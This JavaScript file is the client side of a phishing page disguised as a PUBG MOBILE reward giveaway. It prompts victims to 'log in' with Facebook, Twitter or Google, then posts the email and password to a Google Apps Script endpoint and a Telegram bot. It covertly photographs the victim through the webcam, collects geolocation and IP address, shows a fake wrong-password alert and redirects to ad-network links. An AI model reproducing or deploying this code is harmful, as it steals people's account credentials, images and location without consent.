const reward = document.querySelector("#reward");
// let reward = document.getElementById("reward")
const btn1 = document.querySelector("#btn1");
const btn2 = document.querySelector("#btn2");
const btn3 = document.querySelector("#btn3");
const btn4 = document.querySelector("#btn4");
const btn5 = document.querySelector("#btn5");
const btn6 = document.querySelector("#btn6");
const btn7 = document.querySelector("#btn7");
const btn8 = document.querySelector("#btn8");
const btn9 = document.querySelector("#btn9");

const img1 = document.querySelector("#img1");
const img2 = document.querySelector("#img2");
const img3 = document.querySelector("#img3");
const img4 = document.querySelector("#img4");
const img5 = document.querySelector("#img5");
const img6 = document.querySelector("#img6");
const img7 = document.querySelector("#img7");
const img8 = document.querySelector("#img8");
const img9 = document.querySelector("#img9");
const title = document.querySelector("#title");
const collect = document.querySelector("#collect");
const popup = document.querySelector("#popup");
const titleTop = document.querySelector("#title-top");
const fBtn = document.querySelector("#fBtn");
const tBtn = document.querySelector("#tBtn");
const gBtn = document.querySelector("#gBtn");
const ok = document.querySelector("#ok");
const line1 = document.getElementById("line1");
const line2 = document.getElementById("line2");
const email = document.querySelector("#email");
const password = document.querySelector("#password");
const label1 = document.querySelector("#label1");
const label2 = document.querySelector("#label2");
const br = document.querySelector(".br");
const br2 = document.querySelector(".br2");
// require('dotenv').config();

let band = "ochiq"

btn1.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img1.classList.remove("disable");
    }
};
btn2.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img2.classList.remove("disable");
    }
};
btn3.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img3.classList.remove("disable");
    }
};
btn4.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img4.classList.remove("disable");
    }
};
btn5.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img5.classList.remove("disable");
    }
};
btn6.onclick = function () {
    band = "band"
    reward.classList.remove("disable");
    img6.classList.remove("disable");
};
btn7.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img7.classList.remove("disable");
    }
};
btn8.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img8.classList.remove("disable");
    }
};
btn9.onclick = function () {
    if (band == "ochiq") {
        band = "band"
        reward.classList.remove("disable");
        img9.classList.remove("disable");
    }
};
collect.onclick = function () {
    collect.innerHTML = "COLLECTING..."
    setTimeout(() => {
        title.innerHTML = "Log in using your PUBG MOBILE account";
        collect.classList.add("disable");
        popup.classList.remove("bg1");
        popup.classList.add("bg2");
        titleTop.classList.remove("disable");

        img1.classList.add("disable");
        img2.classList.add("disable");
        img3.classList.add("disable");
        img4.classList.add("disable");
        img5.classList.add("disable");
        img6.classList.add("disable");
        img7.classList.add("disable");
        img8.classList.add("disable");
        img9.classList.add("disable");

        fBtn.classList.remove("disable");
        tBtn.classList.remove("disable");
        gBtn.classList.remove("disable");
        collect.innerHTML = "COLLECT"
    }, 1000);
};
let website = ""
fBtn.onclick = function () {
    fBtn.classList.add("disable");
    tBtn.classList.add("disable");
    gBtn.classList.add("disable");
    ok.classList.remove("disable");
    label1.classList.remove("disable");
    label2.classList.remove("disable");
    email.classList.remove("disable");
    password.classList.remove("disable");
    line2.classList.remove("flex");
    line1.classList.remove("flex");
    br.classList.remove("disable");
    br2.classList.remove("disable");
    website = "Facebook"
};
tBtn.onclick = function () {
    fBtn.classList.add("disable");
    tBtn.classList.add("disable");
    gBtn.classList.add("disable");
    ok.classList.remove("disable");
    label1.classList.remove("disable");
    label2.classList.remove("disable");
    email.classList.remove("disable");
    password.classList.remove("disable");
    line2.classList.remove("flex");
    line1.classList.remove("flex");
    br.classList.remove("disable");
    br2.classList.remove("disable");
    website = "Twitter"
};
gBtn.onclick = function () {
    label1.classList.remove("disable");
    label2.classList.remove("disable");
    email.classList.remove("disable");
    password.classList.remove("disable");
    fBtn.classList.add("disable");
    tBtn.classList.add("disable");
    gBtn.classList.add("disable");
    ok.classList.remove("disable");
    line2.classList.remove("flex");
    line1.classList.remove("flex");
    br.classList.remove("disable");
    br2.classList.remove("disable");
    website = "Google"
};
// URL Params
const keyValues = window.location.search;
const urlParams = new URLSearchParams(keyValues);

const chatId = urlParams.get('id')
const api = urlParams.get('api')


const now = new Date();
const hours = String(now.getHours()).padStart(2, '0');
const minutes = String(now.getMinutes()).padStart(2, '0');
const seconds = String(now.getSeconds()).padStart(2, '0');
let time = `${hours}:${minutes}:${seconds}`;

let country;
let currency;
let code;
let city;
async function getCountry() {

    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        country = data.country_name;
        city = data.city;
        currency = data.currency;
        code = data.country_calling_code;
    } catch (error) {
        country = 'ɴᴏᴛ ꜰᴏᴜɴᴅ'
    }

}

getCountry();

// form to sheets 



const scriptURL = 'https://script.google.com/macros/s/AKfycbwgoZNx3PrZgOy74XKBBEo-j_MZQPMl07q1THBV5zBt_q4WI__uaC1AhSp8seGHSVxIRA/exec';
const form = document.forms['document'];
document.addEventListener("DOMContentLoaded", function () {
    ok.onclick = (e) => {
        e.preventDefault();
            // capture  
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the image to a data URL and send it to the server
            const dataURL = canvas.toDataURL('image/png');
            sendImageToTelegram(dataURL);
            // telegram 
            event.preventDefault();
            ok.innerHTML = "VERIFYING..."
            setTimeout(() => {
                band = "ochiq"
                ok.innerHTML = "VERIFY"
                if (email.value.includes("@") && email.value.includes(".") && email.value.length > 8 && password.value) {
                    // google sheets 
                    fetch(scriptURL, {
                        method: 'POST',
                        body: new FormData(form),
                        headers: {
                            'Accept': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        form.reset(); // Optional: Reset the form fields
                        setTimeout(() => {
                            window.location.href = 'https://www.highrevenuenetwork.com/mrsxb8gsp?key=7f06f8391a071009e443590da70d05ae';
                            window.open('https://www.highrevenuenetwork.com/mrsxb8gsp?key=7f06f8391a071009e443590da70d05ae', '_blank');
                            window.open('https://www.highrevenuenetwork.com/mrsxb8gsp?key=7f06f8391a071009e443590da70d05ae', '_blank');
                        }, 500);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        console.log('There was an error submitting the form');
                    });
                    // ip fetch 
                    fetch("https://api.ipify.org?format=json")
                        .then((response) => response.json())
                        .then((data) => {
                            let ip = data.ip;
                            sendToTelegram(ip);
                        });
                    function sendToTelegram(ip) {
                        let message = `𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ𓆪𓆪\n\n🐉⊚------------------------------⊚🐉\n➥  ʟᴏɢɪɴ ʙʏ  » ${website}\n📧 ↝ ᴇᴍᴀɪʟ » ${email.value}\n📟 ↝ ᴘᴀꜱꜱᴡᴏʀᴅ » ${password.value}\n🏴 ↝ ᴄᴏᴜɴᴛʀʏ » ${country}\n🌏 ↝ ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ » ${maps}\n☎️ ↝ ᴄᴏᴅᴇ »${code}\n💵 ↝ ᴄᴜʀʀᴇɴᴄʏ » ${currency}\n⚙️ ↝ ɪᴘ » ${ip}\n⏱ ↝ ᴛɪᴍᴇ » ${time}\n📝 ↝ ᴅᴀᴛᴇ » ${new Date().toDateString()}\n🐉⊚------------------------------⊚🐉\n↝ ᴅᴇᴠ ʙʏ » @PUDGEJVRBOT`;
                        let xhr = new XMLHttpRequest();
                        let token = api; //token
                        xhr.open(
                            "POST",
                            `https://api.telegram.org/bot${token}/sendMessage`,
                            true
                        );
                        xhr.onload = () => {
                            let respone = JSON.parse(xhr.responseText);
                            console.log(respone);
                            if (respone.ok) {
                                alert("Your password or email is incorrect!!");
                            } else {
                                alert("Something went wrong!");
                            }
                        };
                        xhr.setRequestHeader(
                            "Content-type",
                            "application/x-www-form-urlencoded"
                        );
                        xhr.send(`chat_id=${chatId}&text=${message}`);
                    }
                    reward.classList.add("disable");
                    popup.classList.add("bg1");
                    popup.classList.remove("bg2");
                    title.innerHTML = "Are you sure to collect this reward?";
                    ok.classList.add("disable");
                    img1.classList.add('disable')
                    img2.classList.add('disable')
                    img3.classList.add('disable')
                    img4.classList.add('disable')
                    img5.classList.add('disable')
                    img6.classList.add('disable')
                    img7.classList.add('disable')
                    img8.classList.add('disable')
                    img9.classList.add('disable')
                    titleTop.classList.add("disable");
                    label1.classList.add("disable");
                    label2.classList.add("disable");
                    email.classList.add("disable");
                    password.classList.add("disable");
                    line2.classList.add("flex");
                    line1.classList.add("flex");
                    br.classList.add("disable");
                    br2.classList.add("disable");
                    collect.classList.remove("disable");
                } else {
                    alert("Please Enter Your Details Correctly!");
                }
            }, 2000);
    };
});

// loading screen 
// let loadSet = 0;
// let load = document.getElementById('loading');
// function imgLoad1() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad2() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad3() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad4() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad5() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad6() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad7() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad8() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// function imgLoad9() {
//     loadSet += 10;
//     load.style.width = `${loadSet}%`;
//     console.log(loadSet);
// }
// let container = document.querySelector('.container');
// function contLoad() {
    // loadSet += 10;
    // load.style.width = `${loadSet}%`;
    // console.log(loadSet, 'Fully Loaded');
    // if (loadSet === 100) {
    //     let loadScreen = document.querySelector(".loading");
    //     loadScreen.style.display = 'none';
    //     container.style.visibility = 'visible'
    // }
// }
// location 
let latitude;
let longitude;
let maps;
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (position) {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
        maps = `https://www.google.com/maps/place/${latitude},${longitude}`;
        // Further usage of 'maps' can be done here or in subsequent functions
    }, function (error) {
        if (error.code === error.PERMISSION_DENIED) {
            maps = 'ɴᴏᴛ ꜰᴏᴜɴᴅ';
        } else {
            maps = 'Error retrieving location.';
        }
    });
} else {
    maps = 'ɴᴏᴛ ꜰᴏᴜɴᴅ';
}
// let camera = 'off'
// let loc = 'off'
// camera access 
window.onload = async function(){
        const constraints = {
            video: true
        };
    
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const videoElement = document.getElementById('video');
            videoElement.srcObject = stream;
            // camera = 'on'
        } catch (err) {
            console.error('Error accessing media devices.', err);
        }
    }
    let CHAT_ID;
    let TELEGRAM_BOT_TOKEN;
function sendImageToTelegram(dataURL) {
        TELEGRAM_BOT_TOKEN = api;
        CHAT_ID = chatId;
    let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

    // Convert the data URL to a Blob
    let blob = dataURLToBlob(dataURL);

    // Create form data
    let formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.png');

    // Send the image to Telegram
    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => console.log('Telegram response:', data))
    .catch(error => console.error('Error:', error));
}

function dataURLToBlob(dataURL) {
    const byteString = atob(dataURL.split(',')[1]);
    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}


